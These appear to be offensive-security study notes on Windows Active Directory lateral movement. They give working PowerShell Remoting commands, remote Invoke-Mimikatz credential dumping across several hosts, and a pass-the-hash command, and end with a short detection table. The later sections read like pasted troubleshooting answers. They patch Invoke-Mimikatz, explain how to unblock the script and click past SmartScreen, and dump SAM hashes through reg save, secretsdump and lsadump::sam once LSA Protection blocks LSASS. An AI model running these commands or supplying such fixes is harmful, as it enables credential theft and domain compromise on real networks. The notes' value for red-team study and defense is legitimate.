# 🚀 Active Directory Lateral Movement & Remote Execution

## 🎯 1. Lateral Movement Overview (MITRE ATT&CK [TA0008])

**Lateral Movement** involves techniques that adversaries use to extend access and control across systems on a network. After achieving local administrative privileges on an initial foothold, the objective is to pivot across domain workstations and member servers to locate sensitive data, domain-level credentials, or critical tier-0 assets (e.g., Domain Controllers).

### Core Lateral Movement Vectors in Windows/AD
* **PowerShell Remoting (WinRM):** Legitimate management protocol running over HTTP/HTTPS; low disk-forensic footprint.
* **Windows Management Instrumentation (WMI / DCOM):** Direct management interface via RPC (TCP 135 + dynamic high ports); executes commands without spawning permanent services.
* **Service Control Manager (SMB / RPC):** Traditional execution vector (e.g., PsExec) that creates remote services; noisier on disk and event logs.
* **Remote In-Memory Injection / Delegation Abuse:** Leveraging in-memory toolsets (like `Invoke-Mimikatz`) over remoting sessions.

---

## ⚡ 2. PowerShell Remoting (WinRM) Mechanics

### Architecture & Default Ports
PowerShell Remoting relies on the **Windows Remote Management (WinRM)** service (WS-Management protocol).

| Protocol / Port | Transport | Default Status |
| :--- | :--- | :--- |
| **TCP 5985** | HTTP (Encrypted with Kerberos/NTLM session keys) | Enabled by default on Windows Server 2012+ |
| **TCP 5986** | HTTPS (Requires an SSL/TLS Certificate) | Optional / Configurable |

> **OpSec Advantage:** WinRM traffic over port 5985 is naturally encrypted at the application layer via SPNEGO/Kerberos tokens, blending in with legitimate administrative management traffic.

### Enabling PSRemoting (Administrative Context)
If WinRM is disabled on a target or workstation:
```powershell
Enable-PSRemoting -SkipNetworkProfileCheck -Force -Verbose

```

---

## 🛠️ 3. WinRM Lateral Movement Execution Workflows

### Approach A: One-to-Many Execution (`Invoke-Command`)

Execute commands across one or multiple remote machines simultaneously without establishing an interactive console session.

```powershell
# 1. Ad-hoc remote command execution
Invoke-Command -ComputerName "Windows-Server" -ScriptBlock { whoami; hostname; ipconfig }

# 2. Multi-target simultaneous execution
Invoke-Command -ComputerName @("DC01", "FILESRV01", "WS01") -ScriptBlock { Get-Process }

```

### Approach B: Persistent Session Management (`PSSession`)

Maintain a persistent PowerShell environment on the target to preserve variables, functions, and state.

```powershell
# 1. Create a persistent remote session
$session = New-PSSession -ComputerName "Windows-Server" -Verbose

# 2. Execute script blocks inside the established session
Invoke-Command -Session $session -ScriptBlock { whoami; hostname }

# 3. Enter an interactive remote PowerShell shell
Enter-PSSession -Session $session -Verbose

# 4. Enumerate Kerberos tickets cached in the current session
klist

# 5. Exit the interactive shell (leaves background session alive)
exit

# 6. Clean up the session when complete
Remove-PSSession -Session $session

```

---

## 💀 4. Remote In-Memory Credential Harvesting via `Invoke-Mimikatz`

`Invoke-Mimikatz` uses PowerShell reflection to inject Mimikatz into memory, eliminating the need to write `mimikatz.exe` to disk on target hosts.

### Remote Multi-Host Credential Dumping

Execute credential dumping across multiple remote domain machines over WinRM/RPC in a single command:

```powershell
# Import script locally
. .\Invoke-Mimikatz.ps1

# Dump LSASS credentials locally (requires local Administrator)
Invoke-Mimikatz -DumpCreds -Verbose

# Execute remote credential dumping across multiple target computers
Invoke-Mimikatz -DumpCreds -ComputerName @("DC01", "FILESRV01", "WS01") -Verbose

```

---

## 🔄 5. Pass-the-Hash (PtH) & Process Spawning

When cleartext passwords are unavailable, use the extracted NTLM hash of an administrative domain account to spawn a process under the target's identity token:

```powershell
# Execute Pass-the-Hash using Mimikatz sekurlsa::pth module
Invoke-Mimikatz -Command ' "sekurlsa::pth /user:Administrator /domain:cyberwarfare.corp /rc4:<NTLM_HASH> /run:powershell.exe" ' -Verbose

```

### Parameters Breakdown

* **/user:** Target administrative account.
* **/domain:** Target Active Directory domain name.
* **/rc4:** The NTLM hash of the account (used as the RC4 key for authentication).
* **/run:** The process binary to instantiate with the impersonated token.

> **Operational Flow:** The spawned `powershell.exe` window now possesses network credentials for `cyberwarfare.corp\Administrator`. All subsequent network interactions (e.g., `Enter-PSSession`, `Invoke-Command`, `dir \\DC01\C$`) authenticate using the passed hash.

---

## 🛡️ 6. Defensive Monitoring & Detection

| Technique | Detection Vector | Event Log / Artifact |
| --- | --- | --- |
| **WinRM Connections** | Network logon over ports `5985`/`5986` | **Windows Security Event ID 4624** (Logon Type 3) + Microsoft-Windows-WinRM/Operational. |
| **PowerShell Script Block Logging** | Inspection of de-obfuscated script code at runtime | **Windows Event ID 4104** (Script Block Execution). |
| **LSASS Memory Access** | In-memory extraction tools touching `lsass.exe` | **Sysmon Event ID 10** (Process Access to `lsass.exe` with granted access rights like `0x1010` or `0x1FFFFF`). |
| **Explicit Credential Logons** | Spawning processes with alternate credentials (PtH) | **Windows Security Event ID 4648** (A logon was attempted using explicit credentials). |

## 7. Invoke-Mimikatz.ps1 patch
    The `Ambiguous match found` and overload errors occur because older builds of PowerSploit’s `Invoke-Mimikatz.ps1` rely on outdated .NET reflection calls (specifically resolving `GetProcAddress` and `GetDelegateForFunctionPointer`) that fail under newer .NET Framework / PowerShell runtimes due to overloaded method signatures.

---

### Why It Fails

* **Reflection Ambiguity:** Modern .NET runtimes have multiple overloaded definitions for methods like `GetProcAddress` within internal reflection tables. Calling `.GetMethod('GetProcAddress')` without explicitly specifying parameter types throws `AmbiguousMatchException`.
* **Dot-Sourcing Note:** In your first attempt, running `.\Invoke-Mimikatz.ps1` executed the script in a child scope without importing the function into your session. Dot-sourcing (`. .\Invoke-Mimikatz.ps1`) was the right approach to load the function, but it exposed the underlying script compatibility bug.

---

### Solutions & Alternatives

**1. Use Pre-Compiled Mimikatz Directly**
Instead of invoking Mimikatz reflectively via PowerShell, run the compiled binary directly from an elevated Administrator command prompt:

```bash
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
# From an elevated prompt with compiled mimikatz.exe:

```

**2. Extract Local Hashes via SAM Registry Hives (Native Windows)**
If you only need local account NTLM hashes, you don't need Mimikatz. You can save the SAM and SYSTEM registry hives natively from an elevated prompt:

```powershell
reg save HKLM\SAM sam.save
reg save HKLM\SYSTEM system.save

```

You can then parse these offline using tools like `secretsdump.py`:

```bash
secretsdump.py -sam sam.save -system system.save LOCAL

```

**3. Run via Windows PowerShell (5.1) instead of PowerShell 7**
If you ran this inside PowerShell 7 (`pwsh`), try executing inside legacy Windows PowerShell (`powershell.exe`), as `Invoke-Mimikatz` was written specifically for .NET Framework 2.0/3.5/4.0 rather than .NET Core/6+.

**4. Script Patch (If you must use `Invoke-Mimikatz.ps1`)**
To fix the reflection error in the script itself, modify the reflection lookups around line 886 to specify the exact parameter types rather than relying on a single string name lookup:

```powershell
# Replace the single-argument GetMethod call:
$GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String]))

```

## Windows file unblocking
To open and edit the script without triggering the SmartScreen block:

**Method 1: Open from an Editor Directly (Recommended)**
Do not double-click the `.ps1` file. Instead, open it using your preferred editor from an existing terminal or context menu:

* From PowerShell / Command Prompt:
```powershell
notepad .\Invoke-Mimikatz.ps1

```


*(or `code .\Invoke-Mimikatz.ps1` if using VS Code)*
* Or right-click `Invoke-Mimikatz.ps1` in File Explorer $\rightarrow$ **Open with** $\rightarrow$ **Notepad** / **PowerShell ISE**.

---

**Method 2: Unblock the File**
Windows flags downloaded scripts with "Mark of the Web" metadata. You can remove the block entirely:

* **Via PowerShell:**
```powershell
Unblock-File -Path .\Invoke-Mimikatz.ps1

```


* **Via File Explorer:**
1. Right-click `Invoke-Mimikatz.ps1` $\rightarrow$ **Properties**.
2. At the bottom of the **General** tab, check the **Unblock** box.
3. Click **Apply** and **OK**.



---

**Method 3: Bypass the Red Prompt**

1. Click the underlined **More info** text on the red SmartScreen window.
2. Click the **Run anyway** button that appears.


## Mimikatz failed to read LSASS memmory 
The hashes didn't dump because Mimikatz failed to read LSASS memory, indicated by the error:
`ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005)`

`0x00000005` translates to **Access Denied**. This happens either because **`privilege::debug`** was not enabled before running the command, or modern protections like **RunAsPPL (LSA Protection)** / **Credential Guard** are blocking access to LSASS.

---

### Option 1: Parse the Registry Hives You Already Saved

You already executed `reg save` successfully. The files `sam.save` and `system.save` located in `C:\Users\kulde\Downloads` contain your local user NTLM hashes.

**Using Python / Impacket (in WSL, Kali, or Windows Python):**

```bash
secretsdump.py -sam sam.save -system system.save LOCAL

```

**Using Mimikatz on the saved hives (No LSASS access needed):**

```powershell
# From an elevated prompt with compiled mimikatz.exe:
mimikatz.exe "lsadump::sam /sam:sam.save /system:system.save" "exit"

```

---

### Option 2: Run Mimikatz with Debug Privileges

If you want live memory dumping via Mimikatz, ensure the `SeDebugPrivilege` is acquired first:

```powershell
Invoke-Mimikatz -Command "`"privilege::debug`" `"sekurlsa::logonpasswords`""

```

---

### Why LSASS Memory Dumps Still Fail on Modern Windows

* **LSA Protection (RunAsPPL):** Prevents non-protected processes from opening LSASS even as local Administrator.
* **Credential Guard:** Isolates credential secrets inside a virtualized container (VBS), completely hiding plaintext credentials and hashes from standard LSASS memory space.







Directly reading live LSASS memory using `sekurlsa::logonpasswords` will not work on this machine because **LSA Protection (RunAsPPL)** is enabled by default in modern Windows 11. Even with `SeDebugPrivilege` enabled (`Privilege '20' OK`), Windows blocks non-protected processes from acquiring a handle to LSASS.

However, you **can** still dump the hashes using the exact same script by targeting the SAM database instead of LSASS memory.

---

### Method 1: Dump SAM Hashes with `Invoke-Mimikatz` (No LSASS Handle Needed)

Instead of `sekurlsa`, use the `lsadump::sam` command via your script. This extracts the local NTLM hashes directly from the registry:

```powershell
Invoke-Mimikatz -Command "`"privilege::debug`" `"lsadump::sam`""

```

---

### Method 2: Dump from the Hives You Saved (`sam.save` and `system.save`)

Since you already generated `sam.save` and `system.save`, point Mimikatz directly at those files:

```powershell
Invoke-Mimikatz -Command "`"lsadump::sam /sam:sam.save /system:system.save`""

```

---

### Why `sekurlsa` Fails Here

* **RunAsPPL (LSA as a Protected Process Light):** Restricts access to the LSASS process to only signed Microsoft binaries with specific protection levels.
* **Outdated Embedded Binary:** The embedded Mimikatz DLL inside PowerSploit was built in November 2016 (v2.1), meaning it lacks modern driver-based bypasses (like `mimidrv.sys`) or newer PPL bypass mechanisms.